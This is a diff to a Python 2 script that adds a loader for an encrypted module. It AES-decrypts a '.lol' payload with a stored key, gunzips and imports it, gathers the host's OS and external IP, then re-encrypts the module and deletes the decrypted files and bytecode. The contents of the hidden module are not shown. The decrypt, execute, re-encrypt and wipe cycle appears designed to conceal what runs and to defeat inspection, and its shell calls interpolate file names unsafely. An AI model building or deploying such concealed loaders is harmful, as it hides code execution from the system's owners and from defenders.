@@ -30,6 +30,11 @@ def create_utils():
 
 
 def decode_module(modfile):
+	import utils
+	# decrypt it
+	k = base64.b64decode(open(modfile+'.key','rb').read())
+	fdat = open(modfile+'.lol','rb').read()
+	open('%s.b64.gz'%modfile,'wb').write(utils.DecodeAES(utils.AES.new(k), fdat))
 	os.system('gunzip %s.b64.gz' % modfile)
 	content = ''
 	for chunk in open(modfile+'.b64','rb').readlines():
@@ -49,14 +54,33 @@ def serve():
 	os.system('python tmp.py')
 	os.remove('tmp.py')
 
+def cleanup():
+	# cleanup 
+	cleanup = ['module.py', 'utils.py', 'utils.pyc', 'module.pyc','module.b64.gz']
+	for fobj in cleanup:
+		try:
+			os.remove(fobj)
+		except OSError:
+			pass
+	exit()
+
 
 def main():
 	create_utils()
 	import utils 
+
+
+	if '-e' in sys.argv and len(sys.argv) > 2:
+		fname = sys.argv[2]
+		if os.path.isfile(fname):
+			utils.fencrypt(fname,True)
+		cleanup()
+
 	decode_module('module')
 	import module
-
+	
 	if module.nix:
+		
 		print 'UNIX system'
 		curdir = module.pwd
 		ext_ip = module.get_ext_ip()
@@ -73,14 +97,14 @@ def main():
 
 		if '-s' in sys.argv:
 			serve()
+		os.system('python test.py -e module.b64.gz')
+		cleanup()
 		
 	if module.dos:
 		print 'Windows System'
+		cleanup()
 	
-	# cleanup 
-	cleanup = ['module.py', 'utils.py', 'utils.pyc', 'module.pyc']
-	for fobj in cleanup:
-		os.remove(fobj)
+
 
 if __name__ == '__main__':
 	main()
